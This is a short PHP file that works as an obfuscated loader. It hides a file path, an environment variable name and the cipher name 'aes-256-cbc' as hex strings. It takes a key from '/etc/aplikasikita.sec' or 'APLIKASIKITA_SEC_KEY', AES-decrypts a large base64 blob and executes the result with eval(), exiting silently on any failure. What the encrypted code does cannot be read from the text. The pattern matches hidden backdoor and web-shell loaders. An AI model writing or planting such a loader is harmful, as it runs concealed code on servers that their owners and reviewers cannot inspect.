<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZdQHv7nogFhBRv1NPcBZTQ==');

$c=base64_decode(

'33go+gBPu8n8c4yBRXkJoxnONGnU9BNhBXe0+Jcf3/XtEYpYsuB1wl74cF6PLY5X6hbXMhFMIq3B' .
'vP+WrUN35fCBqchOuTFc/vow33nuCTHWS0KMkDC0ZBOaHrpTojBQ5EXvAIYdHsec2v8h72NiKOP+' .
'kbvOjueYCwQZFfh4wmxJ4uvLtMYRVGTdqpv/N0FDVomKu78jMrfBr+vcPlt1UjLZQD2PeBHPS1GI' .
'u9TvXvDBihUpmpCfquxf1nYUSXEcGHVy6h+aRgWqu3nqEqyN9qsYwfB/OPv5e6aE42qoA+K8RJuq' .
'VA6EjN5Hx6zvtpEClh5+JE7gqOrBvv0FlhNQuoXSHEo6gNiE0LzaqhN2tu/lu5WAj9Qu26jVLY58' .
'HZ2O17LH3rdb7hwirOizTuYmrl+hJ1e619XAqie/ahsAyn4V3oKClclgbVzPKvZhCa6V9A1QaX5h' .
'lCf42B/ip4/dWA/LHaDb3N9/WisH+2WEzVmPmd34TVxVW6UfK1cPeXRo9QXuRH6A/AFltgYH7sHb' .
'j0JR3aD8YaRttH8Dy6sXzwFGSKPRnBsE9GxN9+5zpERsokDh+YskTLxoSee9LeFkY2Xjs3OSwRtf' .
'M8d1zET8EFa2o5iFxHP5KK/6HqjfKhwz53OPW7b+eZoXQ9xU7n955Eab5ghudB6FGJ8hZjdRLO1g' .
'BJGeJ8hw40yI1ckoKVzxR+I7EGQs4X+l+XLDt+MRLWv6TqbacsdL3UA0aGzwVuJTRwvDjpSkknNl' .
'0RySn7Ak2Vv7e/KRmUmksMBLsOVnPUuOp7KQXSc4im+9XKWFNEYt17xXGQH9ZNZyuvpr/xi9hRlz' .
'MU6oPlZBvwM+K49zCCFpAysEXMOcO2ehLYgYIEwko70NUBBWpIJt+sOLb/9tRor1OHBXCYPwZ6Ws' .
'hkK6nbjoNup0MSkblZ8WAYkotgisduDQdVCxhM4XxNp3BvMQ/NYy18h/3PvhxhbLE+h7/ZgdVpOF' .
'92W2GPk61sZUvEtXvsDODDMUDYdPbDsTuOaFWgDRetBSJJRyH2KbLtYwxEehYCVQ+/zYzkky3Rdu' .
'RhGHcMdeN8ZhvqmxvV0dGk9IC4A/CB0IWVoytnuD7gE+pY1onAHN4/ljRCvM1aPLYnqAM95oUjOc' .
'j2JXUIhWQ1tub8y04YHR3ZX3YXuPgXTCqvJk3nzfn8doA4k1eYel1sKRolVXIlIwEbUv714XLBsh' .
'3AYvbspLESat7a248rG+q0E5IWa4RxzpxJm3u6IyuxdrDEdgpnbBvY5fWnCj38rjDk2d6m6L3rHd' .
'JJiCmdWAZDVMsV3U/D7nvTtznP66WecAapLX6Gr2QFNARvrDYDMQ5Ev6W91VFtQ3MJKKIyxEuA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

